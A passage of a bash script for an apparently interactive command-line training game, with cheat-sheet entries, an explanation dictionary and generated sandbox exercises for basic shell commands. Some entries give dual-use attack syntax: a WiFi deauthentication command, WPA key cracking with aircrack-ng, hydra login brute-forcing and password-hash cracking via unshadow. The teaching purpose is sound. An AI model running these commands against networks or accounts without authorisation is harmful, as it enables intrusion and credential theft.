  [xxd]=$'hex dump\n  \e[36m-p\e[0m        plain hex (no addr)    \e[36m-r\e[0m        reverse (hex to bin)\n  \e[2mxxd file    xxd -p file    echo hex | xxd -r -p\e[0m'
  [strings]=$'extract text from binary\n  \e[36m-n\e[0m \e[33mN\e[0m      minimum length         \e[36m-e\e[0m \e[33mENC\e[0m    encoding (l=UTF-16LE)\n  \e[2mstrings binary    strings -n 10 binary    strings -e l binary\e[0m'
  [readelf]=$'ELF binary inspector\n  \e[36m-h\e[0m        file header            \e[36m-s\e[0m        symbols\n  \e[36m-a\e[0m        all info\n  \e[2mreadelf -h binary    readelf -s binary    readelf -a binary\e[0m'
  [binwalk]=$'binary analysis\n  \e[36m-e\e[0m        extract embedded       \e[36m-E\e[0m        entropy analysis\n  \e[2mbinwalk binary    binwalk -e binary    binwalk -E binary\e[0m'
  [foremost]=$'file recovery\n  \e[36m-i\e[0m \e[33mFILE\e[0m   input image            \e[36m-o\e[0m \e[33mDIR\e[0m    output directory\n  \e[36m-t\e[0m \e[33mTYPES\e[0m  file types (jpg,pdf)\n  \e[2mforemost -i image.dd    foremost -t jpg,pdf -i image.dd -o output/\e[0m'
  [fls]=$'filesystem listing (TSK)\n  \e[36m-r\e[0m        recursive              \e[36m-d\e[0m        deleted files only\n  \e[36m-m\e[0m \e[33mPATH\e[0m   mactime bodyfile\n  \e[2mfls image.dd    fls -r image.dd    fls -d image.dd    fls -r -m / image.dd\e[0m'
  [rev]=$'reverse each line of text\n  \e[2mrev file    echo hello | rev    rev <<< word\e[0m'
  [bc]=$'calculator\n  \e[2mbc <<< \x272+3\x27    echo \x27scale=2; 10/3\x27 | bc\e[0m'
  [jobs]=$'list background jobs\n  \e[36m-l\e[0m        show PIDs\n  \e[33m%1\e[0m        refer to job 1         \e[33m%%\e[0m        current job\n  \e[2mjobs    jobs -l\e[0m'
  [fg]=$'bring job to foreground\n  \e[2mfg    fg %1    fg %jobname\e[0m'
  [bg]=$'continue stopped job in background\n  \e[2mbg    bg %1\e[0m'
  [kill]=$'send signal to process\n  \e[36m-9\e[0m        SIGKILL (force)        \e[36m-15\e[0m       SIGTERM (graceful)\n  \e[36m-STOP\e[0m     pause process          \e[36m-CONT\e[0m     resume process\n  \e[2mkill PID    kill %1    kill -9 PID    kill -STOP PID\e[0m'
  [wait]=$'wait for background jobs to finish\n  \e[2mwait    wait %1    wait $PID\e[0m'
  [disown]=$'detach job from shell (survives logout)\n  \e[36m-a\e[0m        all jobs               \e[36m-h\e[0m        mark only (don\x27t remove)\n  \e[2mdisown %1    disown -a\e[0m'
  [sleep]=$'pause for N seconds\n  \e[2msleep 1    sleep 0.5    sleep 5\e[0m'
  [jq]=$'JSON processor\n  \e[36m-r\e[0m        raw output (no quotes) \e[36m-c\e[0m        compact output\n  \e[36m-e\e[0m        exit 1 if null         \e[36m-s\e[0m        slurp into array\n  \e[33m.key\e[0m      extract field          \e[33m.key[]\e[0m    iterate array\n  \e[33mselect()\e[0m  filter items           \e[33m| length\e[0m  count elements\n  \e[2mjq . file    jq -r \x27.name\x27 file    jq \x27.[] | select(.active)\x27 file\e[0m'
  [set]=$'shell options\n  \e[36m-e\e[0m        exit on error          \e[36m-u\e[0m        error on undefined var\n  \e[36m-x\e[0m        trace commands          \e[36m-o pipefail\e[0m  fail on pipe error\n  \e[2mset -e    set -euo pipefail    set -x\e[0m'
  [trap]=$'handle signals\n  \e[33mtrap CMD SIGNAL\e[0m       run CMD on SIGNAL\n  \e[33mtrap - SIGNAL\e[0m         reset to default\n  \e[33mtrap CMD EXIT\e[0m         run on script exit\n  \e[2mtrap \x27echo caught\x27 SIGINT    trap cleanup EXIT    trap - SIGINT\e[0m'
  [id]=$'show user/group identity\n  \e[36m-u\e[0m        UID only               \e[36m-g\e[0m        GID only\n  \e[36m-G\e[0m        all group IDs          \e[36m-n\e[0m        names instead of numbers\n  \e[2mid    id -u    id -Gn    id username\e[0m'
  [mount]=$'attach filesystem\n  \e[36m-o\e[0m \e[33mOPTS\e[0m   options (ro, loop, noexec, nosuid, remount)\n  \e[36m-t\e[0m \e[33mTYPE\e[0m   filesystem type        \e[36m-w\e[0m        read-write\n  \e[2mmount /dev/sda1 /mnt    mount -o ro,loop img /mnt    mount -o remount,rw /\e[0m'
  [chroot]=$'change root directory\n  \e[2mchroot /mnt /bin/bash    chroot /mnt cmd\e[0m'
  [fsck]=$'filesystem check/repair\n  \e[36m-y\e[0m        auto-fix               \e[36m-n\e[0m        dry run\n  \e[2mfsck /dev/sda1    fsck -y /dev/sda1\e[0m'
  [dd]=$'low-level block copy\n  \e[33mif=\e[0m       input file             \e[33mof=\e[0m       output file\n  \e[33mbs=\e[0m       block size             \e[33mcount=\e[0m    number of blocks\n  \e[33mstatus=progress\e[0m  show transfer rate\n  \e[33mconv=noerror,sync\e[0m  continue on errors\n  \e[2mdd if=/dev/sda of=disk.img bs=4M status=progress\e[0m'
  [lsof]=$'list open files\n  \e[36m-i\e[0m        network connections    \e[36m-p\e[0m \e[33mPID\e[0m    by process\n  \e[36m-u\e[0m \e[33mUSER\e[0m   by user\n  \e[2mlsof -i :80    lsof -p 1234    lsof /path/to/file\e[0m'
  [dmesg]=$'kernel ring buffer\n  \e[36m-T\e[0m        human timestamps       \e[36m-w\e[0m        follow live\n  \e[36m-l\e[0m \e[33mLEVEL\e[0m  filter by level (err, warn)\n  \e[2mdmesg -T    dmesg -Tw    dmesg -l err\e[0m'
  [cryptsetup]=$'LUKS disk encryption\n  \e[33mluksOpen\e[0m   unlock volume          \e[33mluksClose\e[0m  lock volume\n  \e[33mluksFormat\e[0m format as LUKS\n  \e[2mcryptsetup luksOpen /dev/sda2 crypt    cryptsetup luksClose crypt\e[0m'
  [vol]=$'volatility3 memory forensics\n  \e[33mwindows.pslist\e[0m      process list\n  \e[33mwindows.netscan\e[0m     network connections\n  \e[33mwindows.cmdline\e[0m     command lines\n  \e[33mwindows.filescan\e[0m    file objects\n  \e[2mvol -f dump.raw windows.pslist    vol -f dump.raw windows.netscan\e[0m'
  [airmon-ng]=$'wireless monitor mode\n  \e[33mstart\e[0m     enable monitor         \e[33mstop\e[0m      disable monitor\n  \e[33mcheck kill\e[0m stop interfering processes\n  \e[2mairmon-ng start wlan0    airmon-ng stop wlan0mon    airmon-ng check kill\e[0m'
  [airodump-ng]=$'wireless packet capture\n  \e[36m-c\e[0m \e[33mCH\e[0m     channel                \e[36m--bssid\e[0m \e[33mMAC\e[0m  target AP\n  \e[36m-w\e[0m \e[33mPREFIX\e[0m write capture\n  \e[2mairodump-ng wlan0mon    airodump-ng -c 6 --bssid AA:BB:CC -w cap wlan0mon\e[0m'
  [aireplay-ng]=$'wireless packet injection\n  \e[36m-0\e[0m \e[33mN\e[0m      deauth N packets       \e[36m-a\e[0m \e[33mBSSID\e[0m  target AP\n  \e[36m-c\e[0m \e[33mCLIENT\e[0m target client\n  \e[2maireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0mon\e[0m'
  [aircrack-ng]=$'wireless key cracker\n  \e[36m-w\e[0m \e[33mFILE\e[0m   wordlist               \e[36m-b\e[0m \e[33mBSSID\e[0m  target AP\n  \e[2maircrack-ng -w wordlist.txt -b AA:BB:CC cap-01.cap\e[0m'
  [getcap]=$'show file capabilities\n  \e[36m-r\e[0m        recursive search\n  \e[2mgetcap -r / 2>/dev/null\e[0m'
  [exiftool]=$'read/write file metadata\n  \e[2mexiftool image.jpg    exiftool -all= image.jpg    exiftool -GPS* image.jpg\e[0m'
  [shred]=$'securely overwrite file \e[2m(ineffective on SSD/journaling/CoW fs)\e[0m\n  \e[36m-n\e[0m \e[33mN\e[0m      overwrite N times      \e[36m-z\e[0m        final zero pass\n  \e[36m-u\e[0m        remove after\n  \e[2mshred -zu file    shred -n 3 -zu file\e[0m'
)
# Render manpage: first line as header, rest as body
_mp_show() {
  local cmd=$1; local data="${MANPAGE[$cmd]}"
  printf "%s %s\n" "${W}${B}${cmd}${N}" "${D}- ${data%%$'\n'*}${N}"
  printf '%s\n' "${data#*$'\n'}"
}

declare -A EXP=(
  [pwd]="print working directory (where you are)"
  [echo]="print text to stdout" [cat]="concatenate and display file contents" [ls]="list directory contents"
  [cd]="change directory" [cp]="copy files" [mv]="move/rename files" [rm]="delete files permanently"
  [mkdir]="create directory" [touch]="create file/update timestamp"
  [head]="head -N FILE: first ${Y}N${N} lines (default 10)"
  [tail]="tail -N FILE: last ${Y}N${N} lines (-f to follow)"
  [grep]="grep PATTERN FILE: search lines matching pattern"
  [find]="find PATH -name 'x': locate files by name/size/date"
  [wc]="word count: -l lines, -w words, -c bytes"
  [sort]="sort lines alphabetically (-n numeric, -r reverse, -k N by column ${Y}N${N})"
  [uniq]="filter adjacent duplicates (-c count, -d dupes only — sort -u can't do these)" [cut]="cut -d',' -fN: extract column N (simple columns — awk for logic/math)"
  ['--sort=-%cpu']="sort by CPU% descending (- = descending)"
  ['--sort=-%mem']="sort by memory% descending"
  [tr]="tr FROM TO: map chars (tr a-z A-Z = lowercase->uppercase)"
  [diff]="compare files" [tar]="archive tool" [tee]="split output: file AND screen (>> = file only)" [xargs]="build commands from stdin"
  [chmod]="change permissions" [kill]="send signal to process (default: terminate)" [jobs]="list background jobs" [fg]="foreground job"
  [bg]="background job" [sleep]="pause N seconds" [make]="build tool" [gcc]="C compiler"
  [date]="show/set date" [du]="disk usage" [ps]="list processes"
  [dd]="low-level copy" [strings]="extract text from binary" [base64]="encode/decode base64"
  [rg]="ripgrep: fast grep (respects .gitignore, recursive by default — grep is POSIX/everywhere)"
  [fd]="fast find (regex default, respects .gitignore — find is POSIX/everywhere, more powerful predicates)"
  [eza]="modern ls (git integration, color — ls is POSIX/everywhere)"
  [bat]="cat with highlighting (use cat for piping, bat for reading)"
  [sd]="simple sed (literal strings by default — sed uses regex)" [dust]="visual du (bar chart — du is POSIX/scriptable)"
  [tree]="directory tree" [sed]="stream editor" [xxd]="hex dump"
  [md5sum]="MD5 hash (weak)" [sha256sum]="SHA256 hash" [nmap]="port scanner" [hydra]="password cracker"
  [hashcat]="GPU hash cracker" [john]="John the Ripper" [tshark]="terminal wireshark"
  [masscan]="fast port scanner" [airmon-ng]="WiFi monitor mode"
  [airodump-ng]="capture 802.11" [aireplay-ng]="inject packets" [aircrack-ng]="crack WPA/WEP"
  [nc]="netcat" [ncat]="nmap netcat (supports -e)" [smbclient]="SMB client" [lynis]="security audit" [binwalk]="firmware analysis"
  [foremost]="file recovery" [fls]="list disk image" [exiftool]="file metadata" [readelf]="ELF info"
  [r2]="radare2 RE framework" [vol]="memory forensics (volatility3)" [mactime]="filesystem timeline"
  [proxychains]="proxy traffic" [procs]="modern ps"
  [awk]="pattern scanning & processing" [jq]="JSON processor" [curl]="transfer data (HTTP/FTP)"
  [ssh]="secure shell" [scp]="secure copy (prefer rsync for large/repeat transfers)" [rsync]="incremental transfer (only sends changes — always prefer over scp)"
  [zip2john]="extract hash from zip" [pdf2john]="extract hash from pdf" [rar2john]="extract hash from rar"
  [openssl]="crypto toolkit" [socat]="multipurpose relay"
  [ln]="create links" [readlink]="show link target" [pgrep]="find process by name" [pkill]="kill by name"
  [pidof]="get PID by name" [pstree]="process tree" [ip]="network config" [ss]="socket statistics"
  [lsof]="list open files" [systemctl]="systemd control" [journalctl]="systemd logs"
  [wget]="download files (resume, mirror — curl is for APIs)" [unlink]="remove exactly one file/link (safer than rm for single targets)"
  ['$$']="current shell PID" ['$?']="last exit code" ['$!']="last background PID"
  ['$#']="argument count" ['$@']="all arguments" ['$0']="script name"
  ['!!']="repeat last command" ['!$']="last arg of prev cmd" ['!^']="first arg of prev cmd" ['!*']="all args of prev cmd"
  ['>']="write stdout to file (overwrite — output disappears from terminal)" ['>>']="append stdout to file (output disappears from terminal — use tee to see it too)"
  ['2>']="redirect stderr to file" ['&>']="redirect stdout+stderr to file"
  ['/dev/null']="black hole: discards anything written to it" ['2>&1']="merge stderr into stdout"
  ['<']="input redirect: feed FILE contents into command"
  ['<<<']="here-string: feed a STRING into command"
  ['.']="current directory" ['..']="parent directory" ['~']="home directory" ['/']="root directory (or path separator)"
  ['*']="wildcard: matches any characters" ['?']="wildcard: matches single character"
  ['*.py']="glob: all .py files" ['*.log']="glob: all .log files" ['*.txt']="glob: all .txt files"
  ['*.sh']="glob: all .sh files" ['*.conf']="glob: all .conf files"
  ["'*.py'"]="glob: all .py files (quoted)" ["'*.log'"]="glob: all .log files (quoted)"
  ["'*.txt'"]="glob: all .txt files (quoted)" ["'*.sh'"]="glob: all .sh files (quoted)"
  ["'*.conf'"]="glob: all .conf files (quoted)" ["'*'"]="glob: all files (quoted)"
  ["'...'"]="single quotes: literal string, no expansion" ['"..."']="double quotes: allows \$var expansion"
  ["'hello'"]="literal string 'hello'"
  ['|']="pipe: cmd1 | cmd2 (stdout->stdin)" ['|&']="pipe stdout+stderr"
  ['&&']="run next only if previous succeeds" ['||']="run next only if previous fails"
  ['&']="run in background (returns immediately)"
  ['a-z']="character range: all lowercase letters" ['A-Z']="character range: all uppercase letters" ['0-9']="character range: all digits"
  ['${#var}']="string length" ['${var:-}']="default if unset" ['${var:=}']="set if unset"
  ['${var:?}']="error if unset" ['${var:+}']="alt if set" ['${var#}']="remove prefix (short)"
  ['${var##}']="remove prefix (long)" ['${var%}']="remove suffix (short)" ['${var%%}']="remove suffix (long)"
  ['${var/}']="replace first" ['${var//}']="replace all" ['${var:n}']="substring from n"
  ['${var:n:m}']="substring n to m" ['${var,,}']="lowercase" ['${var^^}']="uppercase"
  [declare]="declare variable type" [mapfile]="read lines into array (same as readarray)" [readarray]="read lines into array (same as mapfile)"
  ['${arr[@]}']="all array elements" ['${#arr[@]}']="array length" ['${!arr[@]}']="array indices"
  [if]="conditional execution" [then]="if body start" [else]="if alternative" [elif]="else if"
  [fi]="end if" [for]="loop over items" [while]="loop while true" [until]="loop until true"
  [do]="loop body start" [done]="end loop" [case]="pattern matching" [esac]="end case"
  [function]="define function" [local]="local variable" [return]="function return"
  [trap]="handle signals" [set]="shell options" [shopt]="bash options"
  [strace]="trace syscalls" [ltrace]="trace library calls" [watch]="run command repeatedly"
  [inotifywait]="watch filesystem events" [parallel]="run jobs in parallel" [flock]="file locking"
  [timeout]="limit command runtime" [chroot]="change root dir" [fsck]="filesystem check"
  [cryptsetup]="LUKS encryption" [iptables]="IPv4 firewall" [nftables]="netfilter firewall"
  [shred]="secure file delete" [smartctl]="disk SMART info" [gcore]="dump process memory"
  [coproc]="coprocess (bidirectional pipe)" [mkfifo]="create named pipe" [fuser]="find process using file"
  [renice]="change process priority" [cgcreate]="create cgroup" [cgexec]="run in cgroup"
  [enum4linux]="SMB enumeration"
  [chkrootkit]="rootkit checker" [rkhunter]="rootkit hunter"
  [bc]="calculator" [rev]="reverse lines" [docker]="container runtime" [crontab]="schedule tasks"
  [tcpdump]="packet capture" [iw]="wireless config"
  [git]="version control" [clone]="copy repository" [commit]="save changes" [push]="upload to remote"
  [pull]="download from remote" [fetch]="download without merge" [merge]="combine branches"
  [rebase]="reapply commits" [stash]="save changes temporarily" [branch]="manage branches"
  [checkout]="switch branch/restore" [switch]="switch branches" [restore]="restore files"
  [reset]="undo commits" [revert]="undo with new commit" [cherry-pick]="apply specific commit"
  [bisect]="binary search for bug" [reflog]="reference logs" [blame]="show line authors"
  [tag]="mark releases" [remote]="manage remotes" [log]="show history"
  [tmux]="terminal multiplexer" [attach]="connect to session"
  [detach]="disconnect from session" [new-session]="create session" [kill-session]="destroy session"
  [split-window]="create pane" [select-pane]="switch pane" [resize-pane]="change pane size"
  [send-keys]="type in pane" [capture-pane]="copy pane content" [source-file]="reload config"
  [getcap]="show capabilities" [setcap]="set capabilities" [whoami]="current user"
  [id]="user/group IDs" [sudo]="run as root" [su]="switch user" [passwd]="change password"
  [useradd]="create user" [usermod]="modify user" [chown]="change owner" [chgrp]="change group"
  [mount]="attach filesystem" [umount]="detach filesystem" [showmount]="list NFS exports"
  [lxc]="LXD container tool" [searchsploit]="exploit database search"
  ['-sV']="nmap version detection" ['-sC']="nmap default scripts" ['-A']="nmap aggressive scan"
  ['-sU']="nmap UDP scan" ['-sn']="nmap ping scan" ['-sT']="nmap TCP connect" ['-Pn']="nmap skip ping"
  ['-p-']="nmap all ports" ['-oN']="nmap normal output" ['-oG']="nmap greppable" ['-oA']="nmap all formats"
  ['{}']="filename placeholder" ['\;']="end -exec" ['-exec']="run on each" ['-delete']="delete matches"
  ['-name']="match filename" ['-size']="match size" ['-type']="match type" ['-mmin']="match time" ['-path']="match path" ['-not']="negate"
  ['NR']="awk line number" ['NF']="awk field count" ['$1']="first field" ['$NF']="last field" ['FS']="field separator"
  ['http-post-form']="POST login (hydra): '/path:user=^USER^&pass=^PASS^:fail_text'" ['http-get']="GET auth (hydra)"
  [paru]="AUR helper (pacman wrapper)" [env]="show/set environment variables"
  [dmesg]="kernel ring buffer messages" [netstat]="network stats (legacy, use ss)"
  [comm]="compare two sorted files line by line" [python3]="Python 3 interpreter"
  [nft]="nftables firewall CLI" [uname]="system info (-a for all)"
  [ping]="test network connectivity" [dig]="DNS lookup" [host]="DNS lookup (simple)"
  [userdel]="delete user account" [hostname]="show/set hostname"
  [unshadow]="combine passwd+shadow for cracking" [ldd]="list shared library dependencies"
  [iwlist]="wireless scan (legacy)"
  [mkinitcpio]="generate initramfs (Arch)" [grub-mkconfig]="generate GRUB config"
  [grub-install]="install GRUB bootloader" [ssh-keygen]="generate SSH key pair"
  [gpg]="GNU Privacy Guard (encrypt/sign)" [vim]="text editor"
  [paste]="merge lines of files" [traceroute]="trace packet route"
  [tracepath]="trace path to host (no root)" [nslookup]="DNS query (legacy, use dig)"
  [free]="show memory usage" [uptime]="system uptime and load"
  [lscpu]="CPU architecture info" [top]="live process viewer"
  [htop]="interactive process viewer" [btop]="modern resource monitor"
  [groups]="show user group memberships"
  [test]="evaluate conditional expression" [export]="set environment variable"
  [wait]="wait for background process" [exit]="exit shell with status"
  [disown]="detach job from shell" [exec]="replace shell with command"
  [unset]="remove variable or function"
)
_exp_line() {
  local tok=$1 exp=$2 tcol=$3
  local pad=$((8 - ${#tok})); ((pad < 0)) && pad=0
  local sp; printf -v sp '%*s' "$pad" ''
  if [[ "$exp" == *:* ]]; then
    printf '  %s%s %s  %s%s %s\n' "${tcol}${tok}${N}" "$sp" "${D}->${N}" "${Y}${exp%%:*}${D}:${N}" "${W}${exp#*: }${N}" ""
  else
    printf '  %s%s %s  %s\n' "${tcol}${tok}${N}" "$sp" "${D}->${N}" "${W}${exp}${N}"
  fi
}
_esc_legend() {
  local _a=$1 _leg=""
  [[ "$_a" == *'\n'* ]] && _leg+="${Y}\\n${D}=newline  "
  [[ "$_a" == *'\t'* ]] && _leg+="${Y}\\t${D}=tab  "
  [[ "$_a" == *'\0'* ]] && _leg+="${Y}\\0${D}=null  "
  [[ "$_a" == *'\r'* ]] && _leg+="${Y}\\r${D}=return  "
  [[ -n "$_leg" ]] && { printf '  %s\n' "${D}${_leg%  }${N}"; REPLY=1; } || REPLY=0
}
explain() {
  local tok n=0 exp tcol cmds=() _ap=1
  printf '%s\n' "${D}----------------------------------------${N}"
  # Collect all pipeline commands (skip env vars like VAR=val)
  for tok in $1; do
    case "$tok" in '|'|'|&'|'&&'|'||'|';'|'&') _ap=1; continue ;; esac
    ((_ap)) && [[ "$tok" != *=* ]] && { cmds+=("$tok"); _ap=0; }
  done
  # Show manpages for pipeline commands (EXP fallback for commands without manpage)
  local _mc=0 _ml=0
  for tok in "${cmds[@]}"; do
    if [[ -n "${MANPAGE[$tok]:-}" ]]; then
      _mp_show "$tok"; local _l; _l=$(printf '%s' "${MANPAGE[$tok]}" | wc -l); ((_ml += _l + 1))
      ((_mc++))
    elif ((${#cmds[@]} > 1)) && [[ -n "${EXP[$tok]:-}" ]]; then
      printf "%s %s\n" "${W}${B}${tok}${N}" "${D}- ${EXP[$tok]}${N}"; ((_ml++)); ((_mc++))
    fi
  done
  if ((_mc)); then
    # Still show EXP entries for operators/redirects alongside manpages
    for tok in $1; do
      case "$tok" in '>'|'>>'|'<'|'<<<'|'2>'|'&>'|'2>&1'|'|'|'|&'|'&&'|'||'|';'|'&') ;; *) continue ;; esac
      exp="${EXP[$tok]:-}"; [[ -z "$exp" ]] && continue
      _exp_line "$tok" "$exp" "${Y}"
      ((_ml++))
    done
    _esc_legend "$1"; ((_ml += REPLY))
    printf '%s\n' "${D}----------------------------------------${N}"
    return
  fi
  local _cp=1  # command position: 1=expecting command, 0=in arguments
  for tok in $1; do
    # Operators/pipes reset to command position
    case "$tok" in '|'|'|&'|'&&'|'||'|';') _cp=1 ;; esac
    exp="${EXP[$tok]:-}"
    if [[ -n "$exp" ]]; then
      # Skip plain words (like 'done') when they're arguments, not commands
      if ((!_cp)); then
        case "$tok" in
          -*|'>'|'>>'|'<'|'<<<'|'2>'|'&>'|'2>&1'|'|'|'|&'|'&&'|'||'|';'|'&') ;;  # always show these
          *) continue ;;  # skip plain words in argument position
        esac
      fi
      # Choose token color based on type
      tcol="${G}"  # default: green for commands
      case "$tok" in
        .|..|~|/*) tcol="${W}" ;;  # paths = white
        '>'|'>>'|'<'|'<<<'|'2>'|'&>'|'2>&1'|'|'|'|&') tcol="${Y}" ;;  # redirects/pipes = yellow
        '&&'|'||'|';'|'&') tcol="${Y}" ;;  # operators = yellow
        -*) tcol="${C}" ;;  # flags = cyan
      esac

      _exp_line "$tok" "$exp" "$tcol"
      ((++n))
    fi
    # After seeing a non-operator token, we're past command position
    case "$tok" in '|'|'|&'|'&&'|'||'|';'|'>'|'>>'|'<'|'<<<'|'2>'|'&>'|'2>&1') ;; *) _cp=0 ;; esac
  done
  # Show full answer if no explanations found
  ((n == 0)) && { printf '  %s\n' "${Y}$1${N}"; ((++n)); }
  _esc_legend "$1"; ((n += REPLY))
  printf '%s\n' "${D}----------------------------------------${N}"
}

# Parse question - handles both | and § delimiters (§ for answers with ||)
# Also extracts sandbox markers: #output:, #state:, #text:
_qoutput="" _qstate="" _qtext=0
_qparse() {
  local q=$1
  _qoutput="" _qstate="" _qtext=0 _qdelim='|'

  # Extract sandbox markers from end
  if [[ $q == *"#text:"* ]]; then
    _qtext=1
    q="${q%%#text:*}"
  fi
  if [[ $q == *"#state:"* ]]; then
    _qstate="${q##*#state:}"
    q="${q%%#state:*}"
  fi
  if [[ $q == *"#output:"* ]]; then
    _qoutput="${q##*#output:}"
    _qoutput="${_qoutput%%#*}"  # Remove any trailing markers
    q="${q%%#output:*}"
  fi

  # Parse prompt and answers
  if [[ $q == *§* ]]; then
    _qdelim='§'
    _qprompt="${q%%§*}"; _qanswers="${q#*§}"; _qans="${_qanswers%%§*}"
  else
    _qdelim='|'
    _qprompt="${q%%|*}"; _qanswers="${q#*|}"; _qans="${_qanswers%%|*}"
  fi
}

# Vi mode: always on (override with CMD_VI=0)
VI_MODE=${CMD_VI:-1}

# ═══════════════════════════════════════════════════════════════════════════════
# QUESTION GENERATORS - Dynamic questions with infinite variations
# ═══════════════════════════════════════════════════════════════════════════════

# Level 1: First Commands (pwd, ls, echo, cd)
gen_level1() {
  local questions=() dir dir2 word num; _ctx
  _fphrase src data logs; dir=$REPLY; _fphrase backup temp config test; dir2=$REPLY
  _fphrase projects demos tools assets; local newdir=$REPLY
  _fphrase hello ready done test ping; word=$REPLY; num=$((RANDOM % 50 + 1))

  # pwd variations
  questions+=("$(_phrase "Print" "Show" "Display") current directory|pwd|#output:~^/sandbox")
  questions+=("$(_phrase "Where am I" "What directory" "Current path")?|pwd|#output:~^/")

  # ls variations
  questions+=("$(_phrase "List" "Show") files in current directory|ls|#output:~server.log")
  questions+=("List $(_phrase "all files" "files") including hidden|ls -a|#output:~\\.\\.")
  questions+=("List files with $(_phrase "details" "permissions" "long format")|ls -l|#output:~^total")
  local _dir_pat; case "$dir" in src) _dir_pat="utils" ;; data) _dir_pat="export" ;; logs) _dir_pat="access" ;; *) _dir_pat="." ;; esac
  questions+=("List files in ${W}${dir}${C} directory|ls ${dir}|#output:~${_dir_pat}")
  questions+=("List ${W}${dir}${C} with details|ls -l ${dir}|#output:~^total")

  # echo variations
  questions+=("Print ${Y}hello world${C}|echo hello world|echo 'hello world'|#output:hello world")
  questions+=("Print ${Y}${word}${C}|echo ${word}|#output:${word}")
  questions+=("Print your username using ${Y}\$USER${C}|echo \$USER|#output:sandbox")
  questions+=("Print your home directory using ${Y}\$HOME${C}|echo \$HOME|#output:~/sandbox")
  questions+=("Print current shell using ${Y}\$SHELL${C}|echo \$SHELL|#output:~sh")
  questions+=("Print the number ${Y}${num}${C}|echo ${num}|#output:${num}")
  questions+=("Print: ${Y}${word} ${word} ${word}${C}|echo ${word} ${word} ${word}|#output:${word} ${word} ${word}")

  # cd variations
  questions+=("$(_phrase "Change to" "Go to" "Enter") ${W}${dir}${C} directory|cd ${dir}")
  questions+=("$(_phrase "Change to" "Go to") ${W}${dir2}${C}|cd ${dir2}")
  questions+=("Go to home directory|cd|cd ~")
  questions+=("Go up one directory|cd ..")
  questions+=("Go up two directories|cd ../..")
  questions+=("Go to filesystem root (/)|cd /")

  # mkdir
  questions+=("Create directory ${W}${newdir}${C}|mkdir ${newdir}")
  questions+=("Create nested directories ${W}${dir}/${newdir}${C} (parents too)|mkdir -p ${dir}/${newdir}")

  printf '%s\n' "${questions[@]}"
}

# Level 2: Save Output (>, >>)
gen_level2() {
  local questions=() log log2 txt cfg word word2 word3 outfile outfile2 num; _ctx
  _fpick SANDBOX_LOGS; log=$REPLY; _fpick SANDBOX_LOGS; log2=$REPLY; _fpick SANDBOX_TXTS; txt=$REPLY; _fpick SANDBOX_CFGS; cfg=$REPLY
  _fphrase hello done ready complete finished saved started stopped; word=$REPLY
  _fphrase entry note line record message update backup; word2=$REPLY
  _fphrase success error warning info debug trace; word3=$REPLY
  _fphrase output.txt files.txt list.txt result.txt; outfile=$REPLY
  _fphrase report.txt data.txt dump.txt export.txt; outfile2=$REPLY
  num=$((RANDOM % 100 + 1))

  # Output redirection: > overwrites, >> appends (mixed to teach the difference)
  questions+=("Write '${word}' to ${W}${txt}${C} - overwrite (use ${Y}>${C})|echo ${word} > ${txt}|#state:contains:${txt}:${word},lines:${txt}:1")
  questions+=("Append '${word2}' to ${W}${log}${C} - add to end (use ${Y}>>${C})|echo ${word2} >> ${log}|#state:contains:${log}:${word2},contains:${log}:[")
  questions+=("Save ls to ${W}${outfile}${C} - overwrite (use ${Y}>${C})|ls > ${outfile}")
  questions+=("Append timestamp to ${W}${log}${C} (use ${Y}>>${C})|date >> ${log}")
  questions+=("Save whoami to ${W}${outfile}${C} - overwrite (use ${Y}>${C})|whoami > ${outfile}")
  questions+=("Append hostname to ${W}${log}${C} (use ${Y}>>${C})|hostname >> ${log}")
  questions+=("Create empty file ${W}${outfile2}${C}|touch ${outfile2}|#state:exists:${outfile2}")

  # tee - write to file AND stdout
  questions+=("Echo '${word}' to screen AND save to ${W}${txt}${C} (use ${Y}tee${C})§echo ${word} | tee ${txt}§#output:${word}")
  questions+=("Echo '${word2}' and append to ${W}${log}${C} (use ${Y}tee${C}, append mode)§echo ${word2} | tee -a ${log}§#output:${word2}")
  questions+=("Run ls, show output AND save to ${W}${outfile}${C} (use ${Y}tee${C})§ls | tee ${outfile}§#state:contains:${outfile}:server.log")

  printf '%s\n' "${questions[@]}"
}

# Level 3: Read Files (cat, head, tail)
gen_level3() {
  local questions=() log log2 txt txt2 cfg cfg2 n n2 n3; _ctx
  _fpick SANDBOX_LOGS; log=$REPLY; _fpick SANDBOX_LOGS; log2=$REPLY
  _fpick SANDBOX_TXTS; txt=$REPLY; _fpick SANDBOX_TXTS; txt2=$REPLY
  _fpick SANDBOX_CFGS; cfg=$REPLY; _fpick SANDBOX_CFGS; cfg2=$REPLY
  n=$((RANDOM % 6 + 3)); n2=$((RANDOM % 5 + 2)); n3=$((RANDOM % 8 + 5))

  # cat - display file (hint base command, user figures out flags)
  local _cat_lc; case "$txt" in notes.txt) _cat_lc=29 ;; todo.txt) _cat_lc=11 ;; *) _cat_lc=1 ;; esac
  questions+=("Display entire ${W}${txt}${C}|cat ${txt}|#output:@${_cat_lc}")
  questions+=("Display ${W}${cfg}${C} with line numbers|cat -n ${cfg}|#output:~^\\s+1")

  # head - first N lines (user figures out -N flag)
  questions+=("First ${n} lines of ${W}${log}${C}|head -${n} ${log}|head -n ${n} ${log}")
  questions+=("First 10 lines of ${W}${cfg}${C}|head ${cfg}|head -10 ${cfg}|head -n 10 ${cfg}")
  questions+=("First line only of ${W}${log}${C}|head -1 ${log}|head -n 1 ${log}")

  # tail - last N lines (user figures out -N flag)
  questions+=("Last ${n2} lines of ${W}${txt}${C}|tail -${n2} ${txt}|tail -n ${n2} ${txt}")
  questions+=("Last 10 lines of ${W}${log}${C}|tail ${log}|tail -10 ${log}|tail -n 10 ${log}")
  questions+=("Last line only of ${W}${txt}${C}|tail -1 ${txt}|tail -n 1 ${txt}")

  # less - scrollable file viewer
  questions+=("Page through ${W}${log}${C} interactively|less ${log}|#text:")
  questions+=("View ${W}${txt}${C} with line numbers in a pager (use ${Y}less${C})|less -N ${txt}|#text:")

  printf '%s\n' "${questions[@]}"
}

# Level 4: Basic Pipes (|)
gen_level4() {
  local questions=() n n2 n3 log log2 txt txt2 cfg cfg2 csv term1 term2 term3; _ctx
  n=$((RANDOM % 5 + 3)); n2=$((RANDOM % 4 + 2)); n3=$((RANDOM % 6 + 5))
  _fpick SANDBOX_LOGS; log=$REPLY; _fpick SANDBOX_LOGS; log2=$REPLY
  _fpick SANDBOX_TXTS; txt=$REPLY; _fpick SANDBOX_TXTS; txt2=$REPLY
